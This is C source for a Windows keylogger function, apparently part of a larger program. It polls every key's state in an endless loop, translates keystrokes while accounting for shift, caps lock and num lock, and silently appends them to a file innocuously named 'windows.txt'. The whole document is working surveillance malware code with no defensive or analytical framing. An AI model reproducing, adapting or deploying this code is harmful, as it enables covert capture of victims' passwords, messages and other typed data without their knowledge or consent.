DWORD WINAPI logg(){
	int vkey,last_key_state[0xFF];
	int isCAPSLOCK,isNUMLOCK;
	int isL_SHIFT,isR_SHIFT;
	int isPressed;
	char showKey;
	char NUMCHAR[]=")!@#$%^&*(";
	char chars_vn[]=";=,-./`";
	char chars_vs[]=":+<_>?~";
	char chars_va[]="[\\]\';";
	char chars_vb[]="{|}\"";
	FILE *kh;
	char KEY_LOG_FILE[]="windows.txt";

	//: Initialize the arrays and variables
	for(vkey=0;vkey<0xFF;vkey++){
		last_key_state[vkey]=0;
	}

	//: Run the keylogger loop indefinitely
	while(1){
		//: Pause execution for 10 milliseconds
		Sleep(10);

		//: Check the state of CAPSLOCK, NUMLOCK, LEFT_SHIFT, and RIGHT_SHIFT
		isCAPSLOCK=(GetKeyState(0x14)&0xFF)>0?1:0;
		isNUMLOCK=(GetKeyState(0x90)&0xFF)>0?1:0;
		isL_SHIFT=(GetKeyState(0xA0)&0xFF00)>0?1:0;
		isR_SHIFT=(GetKeyState(0xA1)&0xFF00)>0?1:0;

		//: Check the state of all virtual keys
		for(vkey=0;vkey<0xFF;vkey++){
			isPressed=(GetKeyState(vkey)&0xFF00)>0?1:0;
			showKey=(char)vkey;

			//: Check if a key is pressed and wasn't pressed before
			if(isPressed==1 && last_key_state[vkey]==0){

				//: Process and convert key presses based on specific conditions

				//: For alphabets
				if(vkey>=0x41 && vkey<=0x5A){
					if(isCAPSLOCK==0){
						if(isL_SHIFT==0 && isR_SHIFT==0){
							showKey=(char)(vkey+0x20); // Convert to lowercase
						}
					}
					else if(isL_SHIFT==1 || isR_SHIFT==1){
						showKey=(char)(vkey+0x20); // Convert to lowercase
					}
				}

				//: For numeric characters
				else if(vkey>=0x30 && vkey<=0x39){
					if(isL_SHIFT==1 || isR_SHIFT==1){
						showKey=NUMCHAR[vkey-0x30]; // Convert to corresponding special character
					}
				}

				//: For right side numpad
				else if(vkey>=0x60 && vkey<=0x69 && isNUMLOCK==1){
					showKey=(char)(vkey-0x30); // Convert to corresponding numeric character
				}

				//: For printable characters
				else if(vkey>=0xBA && vkey<=0xC0){
					if(isL_SHIFT==1 || isR_SHIFT==1){
						showKey=chars_vs[vkey-0xBA]; // Convert to corresponding special character (shifted)
					}
					else{
						showKey=chars_vn[vkey-0xBA]; // Convert to corresponding special character
					}
				}
				else if(vkey>=0xDB && vkey<=0xDF){
					if(isL_SHIFT==1 || isR_SHIFT==1){
						showKey=chars_vb[vkey-0xDB]; // Convert to corresponding special character (shifted)
					}
					else{
						showKey=chars_va[vkey-0xDB]; // Convert to corresponding special character
					}
				}

				//: For right side characters like .,/*-+..
				//: For characters like space, newline, enter, etc.
				//: For enter, use newline character
				//: Do not print other keys
				else if(vkey==0x0D){
					showKey=(char)0x0A; // Convert enter to newline
				}
				else if(vkey>=0x6A && vkey<=0x6F){
					showKey=(char)(vkey-0x40); // Convert numeric keypad keys
				}
				else if(vkey!=0x20 && vkey!=0x09){
					showKey=(char)0x00; // Ignore other keys
				}

				//: Print and save the captured key
				if(showKey!=(char)0x00){
					kh=fopen(KEY_LOG_FILE,"a"); // Open the log file in append mode
					putc(showKey,kh); // Write the key to the log file
					fclose(kh); // Close the log file
				}
			}

			//: Save the last state of the key
			last_key_state[vkey]=isPressed;
		}

	}// End of while loop
}// End of main function
